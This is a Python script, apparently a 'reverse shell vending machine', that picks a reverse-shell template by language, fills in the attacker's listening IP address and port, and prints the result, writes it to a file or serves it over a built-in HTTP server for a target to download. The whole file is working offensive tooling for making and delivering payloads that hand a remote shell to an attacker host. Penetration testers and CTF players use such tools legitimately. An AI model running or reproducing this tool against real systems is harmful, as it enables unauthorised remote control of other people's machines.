import argparse
import shells
import http.server
from httpServer import customHttpServer
import os

ifacesEnabled = False

try:
    import netifaces as ni

    ifacesEnabled = True
except:
    print(
        'Package netifaces not found, cannot use interface for IP retrieval. Install netifaces with `pip install netifaces`')


class ShellHandler(http.server.BaseHTTPRequestHandler):

    def do_GET(self):
        print(self.server)
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(shellContents.encode())


def printShells():
    print('Available shells:')
    for shell in shells.shells:
        print(shell['name'])


def get_ip_address(ifname):
    return ni.ifaddresses(ifname)[ni.AF_INET][0]['addr']


def startHttpServer(httpPort, shellHandler):
    with customHttpServer.TCPServer(("", int(httpPort)), shellHandler) as httpd:
        httpd.serve_forever()


parser = argparse.ArgumentParser(
    description='A script to generate reverse shells on various languages and serve them on http-server.')
parser.add_argument('-l', dest='shell',
                    help='Language to identify the shell to be built. Use -s to see available shells.')
parser.add_argument('-a', dest='localAddr', type=str, help='Address to connect back to')
parser.add_argument('-p', dest='localPort', help='Port to connect back to', default=4444)
parser.add_argument('-o', dest='outfile', help='File to write the reverse shell to')
parser.add_argument('-s', dest='printShells', action='store_true', help='Print available shells')
parser.add_argument('-i', dest="interface", help="Interface name to get ip for reverse shell script")
parser.add_argument('--httpserver', dest='httpServer', action='store_true', default=False,
                    help='Server the reverse-shell file on a http server')
parser.add_argument('--httpport', dest='httpPort', help='Port to start HTTP server in, default 80', default=80)
parser.add_argument('--interactive',
                    dest='interactive',
                    help='Start Reverse shell vending machine in interactive mode',
                    action='store_true',
                    default=False)

args = parser.parse_args()

if args.printShells:
    printShells()
    exit()

results = list(filter(lambda shell: shell['name'] == args.shell, shells.shells))

if len(results) > 0:
    selectedShell = results[0]
else:
    print('ERROR: Unregognized shell type\n')
    printShells()
    parser.print_help()
    exit()

if args.localAddr and args.interface:
    print('Only define local address or interface, not both!')
    parser.print_help()
    exit()

if not args.localAddr and not args.interface and (selectedShell['address']):
    print('Must specify IP or inteface!')
    parser.print_help()
    exit()

if args.interface and ifacesEnabled:
    localAddr = get_ip_address(args.interface)
else:
    localAddr = args.localAddr

shellFile = open(os.path.dirname(os.path.realpath(__file__))+'shells/' + selectedShell['file'], 'r')
shellContents = shellFile.read()
shellContents = shellContents.replace('[LIP]', localAddr).replace('[LP]', str(args.localPort))

if args.outfile:
    outfile = open(args.outfile, 'w+')
    outfile.write(shellContents)
else:
    print(shellContents)

if args.httpServer:

    startHttpServer(args.httpPort, ShellHandler)
